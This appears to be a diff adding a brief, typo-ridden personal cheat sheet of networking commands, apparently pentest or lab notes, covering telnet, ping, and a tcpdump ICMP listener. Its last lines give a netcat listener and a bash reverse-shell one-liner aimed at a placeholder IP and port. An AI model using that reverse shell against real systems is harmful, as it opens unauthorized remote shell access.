@@ -1,0 +1,16 @@
+telnet
+connect 
+default port 23
+telnet Ip port
+
+usful thing ping
+ping ip -C 1
+-C number of pings
+start a listner on an interface
+sudo tcpdump ip proto \\icmp -i eth0
+
+start a shell listner 
+nc nvlp PORT
+
+reverses shell
+bash -i > /dev/tcp/IP/PORT 0>&1
